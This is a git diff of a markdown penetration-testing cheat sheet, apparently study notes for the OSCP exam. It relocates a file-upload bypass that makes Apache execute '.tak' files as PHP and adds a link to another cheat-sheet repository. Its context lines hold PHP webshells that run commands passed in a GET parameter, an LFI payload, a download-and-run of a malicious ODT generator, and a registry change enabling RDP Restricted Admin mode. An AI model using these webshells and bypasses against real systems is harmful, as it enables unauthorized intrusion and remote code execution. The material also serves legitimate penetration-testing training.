@@ -23,6 +23,7 @@
     - [id\_sa](#id_sa)
     - [LFI](#lfi)
   - [Webshell](#webshell)
+  - [File Upload](#file-upload)
   - [Reverse Shell](#reverse-shell)
     - [Bypass](#bypass)
   - [SQLi](#sqli)
@@ -32,7 +33,6 @@
   - [Webdav](#webdav)
   - [ldap\_shell](#ldap_shell)
   - [hash\_catch](#hash_catch)
-  - [File Upload](#file-upload)
 - [Phishing](#phishing)
 - [Foothold](#foothold)
   - [Linux](#linux-1)
@@ -105,6 +105,7 @@
   - [Metasploit](#metasploit)
   - [Empire](#empire)
   - [RDP admin](#rdp-admin)
+  - [sheet](#sheet)
 
 # SWEEP
 ```bash
@@ -311,6 +312,11 @@ data://text/plain;base64,<base64>&cmd=ls
 <?php echo(shell_exec($_GET["cmd"])); ?>
 <?php echo(exec($_GET["cmd"]));?>
 ```
+## File Upload
+```bash
+echo "AddType application/x-httpd-php .tak" > .htaccess
+```
+
 Wordpress <br/>
 https://github.com/p0dalirius/Wordpress-webshell-plugin
 ## Reverse Shell
@@ -431,10 +437,6 @@ wget https://github.com/rmdavy/badodf/raw/master/badodt.py
 python3 badodt.py
 ```
 
-## File Upload
-```bash
-echo "AddType application/x-httpd-php .tak" > .htaccess
-```
 
 # Phishing
 webdav
@@ -1251,3 +1253,6 @@ interact
 ```bash
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
+
+## sheet
+https://github.com/0xsyr0/OSCP
